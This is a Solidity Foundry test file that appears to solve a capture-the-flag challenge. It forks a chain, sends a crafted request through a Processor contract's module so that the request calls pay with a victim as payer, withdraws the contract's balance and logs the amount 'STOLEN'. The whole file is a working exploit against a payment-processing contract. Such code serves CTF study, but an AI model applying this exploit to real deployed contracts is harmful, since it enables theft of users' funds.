// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract CTFTest9 is Test {
    uint256 pk;
    address user;
    string rpc;

    function setUp() public {
        pk = vm.envUint("PK");
        user = vm.envAddress("ADDR");
        rpc = vm.envString("RPC");

        vm.createSelectFork(rpc, 6600625 + 1);

        // console.log("BLOCK", block.number);
        // console.log("TIME ", block.timestamp);
        // console.log();
    }

    function testCTF9() public {
        vm.startPrank(user);

// Processor: 0x8ACF70DaA6541EA459cc3C1B89754C95B90ea7c4
// RequestModule: 0xFF6d3eF5f55657A06C4105658311B75E3295bf91
// CallbackModule: 0xb4F6A3a02815fA7E86a1254690031C38A397B228



        Processor processor = Processor(0x8ACF70DaA6541EA459cc3C1B89754C95B90ea7c4);
        vm.label(address(processor), "PROCESSOR");
        vm.label(address(0xFF6d3eF5f55657A06C4105658311B75E3295bf91), "MODULE");
        // console.log(processor.balance);

        Pranker pranker = new Pranker();

        // Request memory req = Request({
        //     nonce: 0,
        //     requestModule: address(pranker),
        //     requestData: hex"",
        //     callbackModule: address(pranker),
        //     callbackData: ""
        // });

        // uint256 balanceBefore = user.balance;

        // processor.createRequest(req);
        // processor.withdraw(address(processor).balance);

        // uint256 balanceAfter = user.balance;
        // console.log("STOLEN", balanceAfter - balanceBefore);

        bytes32 reqId = 0x8260d28917ccd4b831d638193df1d4e171903c1d026fd3c5f6c5edbf8ef658f0;
        address payer = 0xaD31eB778ebF94D62920D12cC16657b2D87e9a8f;
        address payee = 0xcC87B6cC86edA38b6e7C41B08da6a52cb23b2fAF;

        bytes memory data = abi.encodeWithSelector(Processor.pay.selector, reqId, payer, payee, address(processor).balance);

        RequestParameters memory reqParams = RequestParameters({
            payer: user,
            target: address(processor),
            bondAmount: 0,
            data: data
        });

        bytes memory requestData = abi.encode(reqParams);

        Request memory req = Request({
            nonce: 1,
            requestModule: 0xFF6d3eF5f55657A06C4105658311B75E3295bf91,
            requestData: requestData,
            callbackModule: 0xb4F6A3a02815fA7E86a1254690031C38A397B228,
            callbackData: ""
        });

        uint256 balanceBefore = user.balance;

        processor.createRequest(req);
        processor.processRequest(req);
        processor.withdraw(address(processor).balance);

        uint256 balanceAfter = user.balance;
        console.log("STOLEN", balanceAfter - balanceBefore);
    }
}

  struct RequestParameters {
    address payer;
    address target;
    uint256 bondAmount;
    bytes data;
  }

contract Pranker {
    Processor processor = Processor(0x8ACF70DaA6541EA459cc3C1B89754C95B90ea7c4);

    function createRequest(Request memory _request, address _caller) external {
        bytes32 reqId = processor.getRequestId(_request);
        address payer = 0xaD31eB778ebF94D62920D12cC16657b2D87e9a8f;
        address payee = 0xcC87B6cC86edA38b6e7C41B08da6a52cb23b2fAF;

        processor.pay(reqId, payer, payee, address(processor).balance);

    }
}

interface Processor {
    function processRequest(Request memory _request) external;
    function topUp() external payable;
    function finalizeRequest(Request memory _request) external;
    function createRequest(Request memory _request) external;
    function getRequestId(Request memory _request) external pure returns (bytes32 _requestId);
  function pay( // 3. OBJECTIVE
    bytes32 _requestId,
    address _payer, // victim
    address _payee, // attacker -> caller
    uint256 _amount
  ) external;
  function withdraw(uint256 _amount) external;
}

  struct Request {
    uint256 nonce;
    address requestModule;
    bytes requestData;
    address callbackModule;
    bytes callbackData;
  }